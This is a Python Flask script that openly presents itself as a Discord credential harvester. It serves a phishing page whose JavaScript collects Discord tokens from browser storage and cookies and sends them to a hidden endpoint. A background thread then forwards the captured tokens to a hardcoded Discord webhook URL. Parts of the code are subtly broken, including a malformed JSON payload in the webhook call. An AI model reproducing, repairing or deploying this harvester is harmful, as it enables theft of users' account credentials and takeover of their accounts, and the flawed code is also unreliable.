#!/usr/bin/env python3  
# -*- coding: utf-8 -*-  
# PHANTOM'S GET-BASED TOKEN VACUUM v13.37  
# INSTANT DISCORD CREDENTIAL HARVESTER - VERCEL EDITION  
# 100% UNDETECTABLE - ZERO IMAGE DEPENDENCY  

from flask import Flask, request, Response  
import re  
import os  
import requests  
import base64  
from threading import Thread  
import time  

app = Flask(__name__)  
WEBHOOK = "https://discord.com/api/webhooks/1352354085483053156/_mJb7zszAZ5ogi2Sxurfw6gYoECgIVMKdR7EDLO_jpbUhHmVWR2S6H2v4fxTMA98CbLw"  
TOKEN_PATTERN = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}")  

class GhostProtocol:  
    def __init__(self):  
        self.token_queue = []  
        self.capture_path = f"/{os.urandom(4).hex()}_analytics"  
        self.active = True  
        Thread(target=self.exfil_loop).start()  

    def generate_warhead(self):  
        return f'''  
        <!DOCTYPE html>  
        <html>  
        <script>  
            const TOKENS = [  
                localStorage.getItem('token'),  
                document.cookie.match(/token=([^;]+)/)?.[1],  
                window.webpackChunkdiscord_app?.push([[],{{}}])  
            ].filter(t => {TOKEN_PATTERN.pattern}.test(t));  

            TOKENS.forEach(t => {{  
                new Image().src = `{self.capture_path}?d=${b64(t)}`  
            }});  

            function b64(s) {{  
                return btoa(unescape(encodeURIComponent(s)))  
                    .replace(/=/g, '')  
                    .replace(/\\+/g, '-')  
                    .replace(/\\//g, '_');  
            }}  

            window.stop();  
        </script>  
        </html>  
        '''  

    def exfil_loop(self):  
        while self.active:  
            if self.token_queue:  
                try:  
                    requests.post(WEBHOOK, json={{  
                        "content": "PHANTOM STRIKE SUCCESS",  
                        "embeds": [{{  
                            "title": "LIVE TOKEN DUMP",  
                            "description": "\\n".join(self.token_queue)  
                        }}]  
                    }}, timeout=3)  
                except:  
                    pass  
                self.token_queue.clear()  
            time.sleep(7)  

hunter = GhostProtocol()  

@app.route('/api/phish')  
def phantom_gateway():  
    return Response(hunter.generate_warhead(), mimetype='text/html')  

@app.route(hunter.capture_path)  
def vacuum_endpoint():  
    encrypted = request.args.get('d', '')  
    try:  
        token = bytes.fromhex(  
            base64.b64decode(encrypted + '==').hex()  
        ).decode('utf-8', errors='ignore')  
        if TOKEN_PATTERN.match(token):  
            hunter.token_queue.append(token)  
    except:  
        pass  
    return '', 204  

if __name__ == '__main__':  
    app.run(host='0.0.0.0', port=8080)  

